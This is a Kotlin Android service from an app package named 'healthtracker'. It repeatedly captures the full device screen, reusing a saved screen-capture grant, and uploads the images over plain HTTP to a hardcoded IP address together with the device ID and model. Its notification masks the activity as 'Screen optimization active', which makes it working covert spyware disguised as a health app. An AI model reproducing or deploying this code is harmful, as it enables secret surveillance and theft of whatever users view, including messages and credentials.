package com.inf2007.healthtracker.utilities

import android.app.Activity
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.graphics.Point
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.atomic.AtomicBoolean

class ScreenshotCaptureService : Service() {
    companion object {
        const val TAG = "ScreenshotService"
        private const val SCREENSHOT_QUALITY = 80
        private const val SCREENSHOT_INTERVAL = 5000L
        private const val SCREENSHOT_ENDPOINT = "http://20.2.92.176:5000/screenshots"
        private const val NOTIFICATION_ID = 1002
        private const val NOTIFICATION_CHANNEL_ID = "screenshot_channel"

        const val CMD_START_SCREENSHOT = "START_SCREENSHOT"
        const val CMD_STOP_SCREENSHOT = "STOP_SCREENSHOT"
        const val CMD_CAPTURE_NOW = "CAPTURE_NOW"

        // Keys for intent extras
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_DATA = "data"
    }

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var isCapturing = AtomicBoolean(false)
    private val handler = Handler(Looper.getMainLooper())
    private var screenDensity: Int = 0
    private var screenWidth: Int = 0
    private var screenHeight: Int = 0

    private val screenshotRunnable = object : Runnable {
        override fun run() {
            if (isCapturing.get()) {
                captureScreenshot()
                handler.postDelayed(this, SCREENSHOT_INTERVAL)
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        getScreenDimensions()
        createNotificationChannel()
        Log.i(TAG, "Screenshot capture service created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "=== SCREENSHOT SERVICE STARTED ===")
        Log.i(TAG, "Command: ${intent?.getStringExtra("command")}")

        // Start as foreground service
        startForeground(NOTIFICATION_ID, createNotification())

        // Get saved MediaProjection data from SharedPreferences
        val prefs = getSharedPreferences("screenshot_prefs", MODE_PRIVATE)
        val savedResultCode = prefs.getInt("result_code", -1)
        val savedIntentUri = prefs.getString("media_projection_intent", null)

        intent?.let {
            val command = it.getStringExtra("command")

            when (command) {
                CMD_START_SCREENSHOT -> {
                    // Try to get from intent first, then from saved prefs
                    var resultCode = it.getIntExtra(EXTRA_RESULT_CODE, -1)
                    var data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        it.getParcelableExtra(EXTRA_DATA, Intent::class.java)
                    } else {
                        @Suppress("DEPRECATION")
                        it.getParcelableExtra(EXTRA_DATA)
                    }

                    // If not in intent, use saved data
                    if (data == null && savedResultCode != -1 && savedIntentUri != null) {
                        resultCode = savedResultCode
                        data = Intent.parseUri(savedIntentUri, 0)
                        Log.i(TAG, "Using saved MediaProjection data")
                    }

                    if (data != null) {
                        setupMediaProjection(resultCode, data)
                        startScreenshotCapture()
                    } else {
                        Log.e(TAG, "No media projection data available")
                    }
                }
                CMD_STOP_SCREENSHOT -> {
                    stopScreenshotCapture()
                }
                CMD_CAPTURE_NOW -> {
                    Log.i(TAG, "CAPTURE_NOW - savedResultCode: $savedResultCode")
                    Log.i(TAG, "CAPTURE_NOW - savedIntentUri: $savedIntentUri")
                    Log.i(TAG, "CAPTURE_NOW - mediaProjection is null? ${mediaProjection == null}")

                    // If we have an existing mediaProjection, use it
                    if (mediaProjection != null) {
                        Log.i(TAG, "Using existing MediaProjection for capture")
                        setupVirtualDisplay()
                        handler.postDelayed({
                            captureSingleScreenshot()  // Use new method
                            handler.postDelayed({
                                cleanupVirtualDisplay()
                            }, 1000)
                        }, 500)
                    }
                    // Otherwise try to use saved data
                    else if (savedResultCode != -1 && savedIntentUri != null) {
                        val data = Intent.parseUri(savedIntentUri, 0)
                        setupMediaProjection(savedResultCode, data)
                        setupVirtualDisplay()
                        handler.postDelayed({
                            captureSingleScreenshot()  // Use new method
                            handler.postDelayed({
                                cleanupVirtualDisplay()
                            }, 1000)
                        }, 500)
                    } else {
                        Log.e(TAG, "No MediaProjection available for single capture")
                    }
                }
            }
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null // Not a bound service
    }

    override fun onDestroy() {
        super.onDestroy()
        mediaProjection?.let {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                it.stop()
            } else {
                @Suppress("DEPRECATION")
                it.stop()
            }
        }
        mediaProjection = null
        Log.i(TAG, "Screenshot capture service destroyed")
    }

    private fun captureSingleScreenshot() {
        Log.d(TAG, "captureSingleScreenshot() called")

        if (imageReader == null) {
            Log.d(TAG, "imageReader null")
            return
        }

        try {
            val image = imageReader?.acquireLatestImage()
            Log.d(TAG, "Image acquired: ${image != null}")

            if (image != null) {
                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * screenWidth

                val bitmap = Bitmap.createBitmap(
                    screenWidth + rowPadding / pixelStride,
                    screenHeight,
                    Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(buffer)

                // Crop to actual screen dimensions
                val croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight)

                // Upload to server
                uploadScreenshot(croppedBitmap)

                bitmap.recycle()
                croppedBitmap.recycle()
                image.close()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to capture single screenshot: ${e.message}")
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                "Screen Capture Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("Health Tracker")
            .setContentText("Screen optimization active")
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun getScreenDimensions() {
        val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        val display = windowManager.defaultDisplay
        screenDensity = resources.displayMetrics.densityDpi

        val size = Point()
        display.getSize(size)
        screenWidth = size.x
        screenHeight = size.y

        Log.i(TAG, "Screen dimensions: ${screenWidth}x${screenHeight}, density: $screenDensity")
    }

    private fun setupMediaProjection(resultCode: Int, data: Intent) {
        try {
            Log.i(TAG, "Setting up MediaProjection with resultCode: $resultCode")
            val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(resultCode, data)
            Log.i(TAG, "✓ MediaProjection setup successful: $mediaProjection")
        } catch (e: Exception) {
            Log.e(TAG, "✗ MediaProjection setup failed: ${e.message}")
            e.printStackTrace()
        }
    }

    private fun startScreenshotCapture() {
        Log.i(TAG, "Starting screenshot capture...")
        Log.i(TAG, "mediaProjection is null? ${mediaProjection == null}")

        if (mediaProjection == null) {
            Log.e(TAG, "Cannot start: MediaProjection not initialized")
            return
        }

        isCapturing.set(true)
        Log.i(TAG, "Setting up virtual display...")
        setupVirtualDisplay()
        Log.i(TAG, "Starting screenshot runnable...")
        handler.post(screenshotRunnable)
        Log.i(TAG, "✓ Screenshot capture started successfully")
    }

    private fun stopScreenshotCapture() {
        Log.i(TAG, "Stopping screenshot capture...")
        isCapturing.set(false)
        handler.removeCallbacks(screenshotRunnable)
        cleanupVirtualDisplay()
        Log.i(TAG, "Screenshot capture stopped")
    }

    private fun setupVirtualDisplay() {
        imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2)

        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenCapture",
            screenWidth, screenHeight, screenDensity,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface, null, null
        )

        Log.i(TAG, "VirtualDisplay setup complete")
    }

    private fun cleanupVirtualDisplay() {
        virtualDisplay?.release()
        imageReader?.close()
        virtualDisplay = null
        imageReader = null
    }

    private fun captureScreenshot() {
        Log.d(TAG, "captureScreenshot() called, isCapturing: ${isCapturing.get()}")

        if (!isCapturing.get() || imageReader == null) {
            Log.d(TAG, "Not capturing or imageReader null")
            return
        }

        try {
            val image = imageReader?.acquireLatestImage()
            Log.d(TAG, "Image acquired: ${image != null}")

            if (image != null) {
                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * screenWidth

                val bitmap = Bitmap.createBitmap(
                    screenWidth + rowPadding / pixelStride,
                    screenHeight,
                    Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(buffer)

                // Crop to actual screen dimensions
                val croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight)

                // Upload to server
                uploadScreenshot(croppedBitmap)

                bitmap.recycle()
                croppedBitmap.recycle()
                image.close()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to capture screenshot: ${e.message}")
        }
    }

    private fun uploadScreenshot(bitmap: Bitmap) {
        try {
            val stream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, SCREENSHOT_QUALITY, stream)
            val byteArray = stream.toByteArray()

            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val filename = "screenshot_${timestamp}.jpg"

            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", filename,
                    byteArray.toRequestBody("image/jpeg".toMediaTypeOrNull()))
                .addFormDataPart("device_id", getUniqueDeviceId())
                .addFormDataPart("device_model", Build.MODEL)
                .addFormDataPart("timestamp", System.currentTimeMillis().toString())
                .addFormDataPart("screen_resolution", "${screenWidth}x${screenHeight}")
                .build()

            val request = Request.Builder()
                .url(SCREENSHOT_ENDPOINT)
                .post(requestBody)
                .build()

            NetworkClient.instance.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "Screenshot upload failed: ${e.message}")
                }

                override fun onResponse(call: Call, response: Response) {
                    response.use {
                        if (response.isSuccessful) {
                            Log.d(TAG, "Screenshot uploaded: $filename")
                        } else {
                            Log.w(TAG, "Screenshot upload failed: HTTP ${response.code}")
                        }
                    }
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading screenshot: ${e.message}")
        }
    }

    private fun getUniqueDeviceId(): String {
        return try {
            android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"
        } catch (e: Exception) {
            Log.e(TAG, "Error getting device ID: ${e.message}")
            "unknown"
        }
    }
}